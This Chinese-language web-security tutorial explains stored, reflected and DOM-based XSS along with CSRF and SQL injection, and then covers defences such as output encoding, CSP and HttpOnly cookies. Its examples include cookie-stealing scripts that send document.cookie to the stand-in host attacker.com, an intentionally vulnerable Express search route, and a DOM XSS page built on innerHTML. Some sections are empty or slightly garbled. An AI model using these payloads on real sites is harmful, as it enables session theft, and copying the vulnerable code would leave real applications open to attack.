---
order: 353
---

# Web 攻击方式

[[toc]]

## 什么是 Web 攻击

Web 攻击(WebAttack)是针对用户上网行为或网站服务器等设备进行攻击的行为,如植入恶意代码，修改网站权限，获取网站用户隐私信息等等。 Web 应用程序的安全性是任何基于 Web 业务的重要组成部分，确保 Web 应用程序安全十分重要，即使是代码中很小的 bug 也有可能导致隐私信息被泄露。站点安全就是为保护站点不受未授权的访问、使用、修改和破坏而采取的行为或实践我们常见的 Web 攻击方式有

- `XSS(Cross Site Scripting)`跨站脚本攻击
- `CSRF(Cross--site request forgery)`跨站请求伪造
- `SQL` 注入攻击

## XSS 跨站脚本攻击

### 什么是 XSS

定义：XSS 跨站脚本攻击，允许攻击者将恶意代码植入到提供给其它用户使用的页面中。XSS 涉及到三方，即攻击者、客户端与 Web 应用
目的：XSS 的攻击目标是为了盗取存储在客户端的 cookie 或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互

### 存储型 XSS

存储型 XSS 是指攻击者将恶意代码存储在目标网站的数据库中，当其他用户访问包含这些内容的页面时，恶意代码从数据库中加载并执行。
::: tip 存储型 XSS 的本质
存储型 XSS 的本质就是利用了浏览器会默认执行脚本以及默认加载一些资源（无论是否跨站）的特性 y 的 cookie）

:::

#### 执行原理

- 攻击者将恶意脚本提交到目标网站（如通过评论、留言等表单）
- 服务器将恶意脚本存储在数据库中
- 当其他用户访问包含这些内容的页面时，恶意脚本从服务器加载并执行
- 受害者的浏览器在不知情的情况下执行了恶意脚本

#### 攻击案例

1. 攻击者在评论框中输入：

```html
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

2. 评论被提交并永久存储在论坛数据库中
3. 当其他用户查看包含此评论的页面时，脚本自动执行
4. 用户的会话 cookie 被发送到攻击者的服务器

### 反射型 XSS

反射型 XSS（Reflected XSS）是指恶意脚本作为请求的一部分被发送到服务器，然后服务器在响应中原封不动地"反射"回这些脚本，最终在用户浏览器中执行。

主要特点：

- 非持久性 ​：恶意脚本不会存储在服务器上
- 即时触发 ​：需要诱导用户点击特定链接
- 传播途径 ​：通常通过钓鱼邮件、恶意网站或社交工程传播

#### 执行原理

1. 攻击者构造包含恶意脚本的特殊 URL
2. 通过社交工程诱导受害者点击该 URL
3. 服务器接收请求后，未经验证直接将恶意参数返回
4. 受害者的浏览器解析响应并执行恶意脚本

#### 攻击案例

1. 攻击者构造 URL：

```bash
http://example.com/search?query=<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;</script>
```

2. 受害者点击该链接
3. 服务器返回包含恶意脚本的页面

```js
const express = require('express');
const app = express();

// 有XSS漏洞的搜索路由
app.get('/search', (req, res) => {
  const query = req.query.q || '';
  res.send(`
        <html>
        <body>
            <h1>搜索结果</h1>
            <p>您搜索的是: ${query}</p>
        </body>
        </html>
    `);
});

app.listen(3000, () => {
  console.log('服务器运行在 http://localhost:3000');
});
```

4. 受害者的浏览器执行恶意脚本

最终页面接受到响应的数据然后执行图片加载获取 cookie，所以可以利用此漏洞获取用户的 cookie

### DOM 型 XSS

#### 执行原理

#### 攻击案例

1. 漏洞页面代码 (vulnerable.html)

```html
<!DOCTYPE html>
<html>
  <head>
    <title>DOM XSS 演示</title>
    <script>
      window.onload = function () {
        // 从URL片段中获取内容并直接插入DOM
        const message = location.hash.substring(1);
        document.getElementById('message').innerHTML = decodeURIComponent(message);
      };
    </script>
  </head>
  <body>
    <h1>欢迎页面</h1>
    <div id="message"></div>
  </body>
</html>
```

2. 攻击者构造 URL：

```bash
vulnerable.html#<img src=x onerror="alert('XSS攻击成功!')">
```

### XSSf 防范措施

无论什么样的 XSS 攻击其目的都在于希望盗取用户的敏感信息，攻击者都利用了下面几个性质

1. 网站会默认执行脚本
2. 网站会默认加载一些资源（无论是否跨站）

所以对 XSS 的防范主要有几个方面

1. 输入输出过滤，过滤掉恶意脚本
2. 内容安全策略，通过 csp 设置白名单，限制加载的资源来源
3. HttpOnly Cookie，设置 cookie 属性，防止 JavaScript 读取

#### 输入过滤

对用户输入进行过滤，过滤掉所有可能导致 XSS 攻击的字符，如 `<`、`>`、`"`、`'`、`&` 等。

```js
// PHP示例
htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
```

#### 输出编码

```js
// JavaScript示例
function safeOutput(str) {
  return str.replace(
    /[&<>'"]/g,
    char =>
      ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        "'": '&#39;',
        '"': '&quot;',
      }[char]),
  );
}
```

#### 内容安全策略(CSP)​​：

- `default-src 'self'`：默认只允许加载当前域名下的资源
- `script-src` https://trusted.cdn.com：脚本只能从指定CDN加载
- `img-src` https://trusted.cdn.com：图片只能从指定CDN加载
- `style-src` https://trusted.cdn.com：样式表只能从指定CDN加载
- `connect-src` https://api.example.com：只允许从指定 API 服务器进行连接
- `font-src` https://trusted.cdn.com：字体只能从指定CDN加载

HTML meta 标签设置：

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'" />
```

#### `​HttpOnly Cookie`​：设置 Cookie 的属性

- ​ 禁止 JavaScript 读取 ​：document.cookie 将看不到这个 Cookie
- ​ 仅限 HTTP 请求携带 ​：浏览器自动在请求头中加入，但脚本无法触碰

::: tip token
所以 JWT 不要适用 localStorage 来进行存储，包装成 HttpOnly 的 Cookie 比较好
:::
